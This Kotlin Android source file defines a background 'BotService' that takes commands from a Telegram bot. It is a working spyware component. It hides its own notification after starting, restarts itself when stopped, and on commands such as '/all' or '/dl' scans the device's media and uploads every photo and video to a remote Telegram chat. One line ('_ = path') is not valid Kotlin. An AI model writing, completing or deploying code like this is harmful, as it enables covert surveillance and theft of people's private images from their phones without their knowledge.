package com.k.ultimatetg

import android.app.Service
import android.content.Intent
import android.os.IBinder
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.util.concurrent.ConcurrentHashMap

class BotService : Service() {
    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private var polling: Job? = null

    @Volatile private var pending = ConcurrentHashMap<Long, List<MediaItem>>()

    override fun onCreate() {
        super.onCreate()
        Prefs.init(this)
        NotificationHelper.createChannel(this)
        NotificationHelper.hideAfterStart(this, this)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (Prefs.token.isEmpty() || Prefs.chatId == 0L) { stopSelf(); return START_NOT_STICKY }
        if (polling == null) startPolling()
        return START_STICKY
    }

    private fun startPolling() {
        polling = scope.launch {
            while (true) {
                try {
                    val upd = TelegramApi.getUpdates(Prefs.token, Prefs.offset)
                    if (upd != null && upd.optBoolean("ok")) {
                        val arr = upd.optJSONArray("result") ?: JSONArray()
                        for (i in 0 until arr.length()) {
                            val u = arr.getJSONObject(i)
                            Prefs.offset = maxOf(Prefs.offset, u.optLong("update_id") + 1)
                            handleUpdate(u)
                        }
                    }
                } catch (_: Exception) {}
                delay(1500)
            }
        }
    }

    private fun handleUpdate(u: JSONObject) {
        val msg = u.optJSONObject("message") ?: return
        val chat = msg.optJSONObject("chat")?.optLong("id") ?: return
        if (chat != Prefs.chatId) return

        if (msg.has("document")) {
            val doc = msg.getJSONObject("document")
            val name = doc.optString("file_name")
            if (name.startsWith("up_")) {
                val path = doc.optString("file_id")
                _ = path
            }
        }

        val text = msg.optString("text", "")
        when {
            text.startsWith("/start") -> send(chat, "🤖 <b>Bot online.</b>\n/gallery — list folders\n/folders — folder view\n/dl &lt;folder&gt; — download folder\n/all — download everything")
            text == "/gallery" || text == "/folders" -> showFolders(chat)
            text.startsWith("/dl ") -> {
                val folder = text.removePrefix("/dl ").trim()
                showFolder(chat, folder, 0)
            }
            text == "/all" -> downloadAll(chat, folders = null)
            text == "/help" -> send(chat, "Commands: /gallery /folders /dl &lt;folder&gt; /all")
            else -> send(chat, "Unknown. /help")
        }
    }

    private fun showFolders(chat: Long) {
        val folders = MediaScanner.folders(this)
        if (folders.isEmpty()) { send(chat, "No media found."); return }
        val sb = StringBuilder("📁 <b>Folders</b>\n")
        val rows = ArrayList<JSONArray>()
        folders.entries.take(30).forEach { (name, count) ->
            sb.append("• <code>").append(name).append("</code> — ").append(count).append("\n")
            rows.add(JSONArray().apply {
                put(JSONObject().apply {
                    put("text", "📂 $name ($count)")
                    put("callback_data", "f:$name:0")
                })
            })
        }
        val markup = JSONObject().apply { put("inline_keyboard", JSONArray(rows.toList())) }.toString()
        TelegramApi.sendMessage(Prefs.token, chat, sb.toString(), markup)
    }

    private fun showFolder(chat: Long, folder: String, page: Int) {
        val items = MediaScanner.inFolder(this, folder)
        if (items.isEmpty()) { send(chat, "Empty folder: <code>$folder</code>"); return }
        val pageSize = 10
        val slice = items.drop(page * pageSize).take(pageSize)
        pending[chat] = slice
        val sb = StringBuilder("📂 <b>$folder</b> (${items.size})\n")
        val rows = ArrayList<JSONArray>()
        slice.forEachIndexed { idx, item ->
            val icon = if (item.isVideo) "🎬" else "🖼"
            val size = item.size / 1024
            sb.append("$icon ").append(item.name).append(" — ${size}KB\n")
            rows.add(JSONArray().apply {
                put(JSONObject().apply {
                    put("text", "$icon ${item.name.take(20)}")
                    put("callback_data", "g:$folder:$idx")
                })
            })
        }
        val nav = JSONArray()
        if (page > 0) nav.put(JSONObject().apply {
            put("text", "◀ Prev"); put("callback_data", "f:$folder:${page - 1}")
        })
        if ((page + 1) * pageSize < items.size) nav.put(JSONObject().apply {
            put("text", "Next ▶"); put("callback_data", "f:$folder:${page + 1}")
        })
        if (nav.length() > 0) rows.add(nav)
        val markup = JSONObject().apply { put("inline_keyboard", JSONArray(rows.toList())) }.toString()
        TelegramApi.sendMessage(Prefs.token, chat, sb.toString(), markup)
    }

    private fun downloadAll(chat: Long, folders: Set<String>?) {
        scope.launch {
            val items = MediaScanner.scan(this@BotService)
                .filter { folders == null || File(it.path).parentFile?.name in folders }
            send(chat, "⏳ Sending ${items.size} items...")
            var sent = 0
            items.forEach { item ->
                val f = File(item.path)
                if (!f.exists()) return@forEach
                val ok = if (item.isVideo) TelegramApi.sendVideo(Prefs.token, chat, f, item.name)
                         else TelegramApi.sendPhoto(Prefs.token, chat, f, item.name)
                if (ok) { sent++; delay(250) }
            }
            send(chat, "✅ Sent $sent/${items.size}")
        }
    }

    private fun send(chat: Long, text: String) {
        TelegramApi.sendMessage(Prefs.token, chat, text)
    }

    override fun onDestroy() {
        polling?.cancel()
        scope.coroutineContext[Job]?.cancel()
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}